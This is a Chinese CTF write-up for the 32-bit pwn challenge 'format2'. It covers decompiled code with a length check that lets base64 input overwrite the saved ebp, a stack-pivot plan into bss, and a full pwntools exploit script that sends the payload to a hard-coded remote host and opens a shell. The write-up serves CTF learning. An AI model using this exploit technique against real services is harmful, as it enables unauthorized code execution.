# format2

## 来源
World of Attack & Defense


## 难度

2 / 10

## 保护

 ```sh
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
 ```

## 简单描述

程序留有后门函数,是一个输入验证的一个程序

## vul

```c
 int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+18h] [ebp-28h]
  char s; // [esp+1Eh] [ebp-22h]
  unsigned int input; // [esp+3Ch] [ebp-4h]

  memset(&s, 0, 30u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ");
  _isoc99_scanf("%30s", &s);
  memset(&::input, 0, 0xCu);
  v4 = 0;
  input = Base64Decode((int)&s, &v4);
  if ( input > 0xC ) //vul
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&::input, v4, input);
    if ( auth(input) == 1 )
      correct();
  }
  return 0;
 }
...
    
_BOOL4 __cdecl auth(int a1)
{
  char v2; // [esp+14h] [ebp-14h]
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h] //vul

  memcpy(&v4, &input, a1); //可以溢出修改ebp
  s2 = (char *)calc_md5((int)&v2, 12);
  printf("hash : %s\n", s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```

若解密后的长度大于8,那么在auth函数中就可以通过溢出修改ebp

## 知识点

栈迁移

## 思路

通过溢出修改ebp指向input bss段,先在bss段布置堆栈布局, ret + target.那么在执行两次leave后,堆栈就会迁移至我们的布局之中直接运行后门函数.

## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
from base64 import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'format2'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "124.126.19.106"
remotePort = 53187

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	get_shell = 0x08049284
	ret = 0x08049425
	bss = 0x0811EB40

	ru(':')
	p = p32(ret)
	p += p32(get_shell)
	p += p32(bss)
	p = base64.b64encode(p)

	sl(p)

	
def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

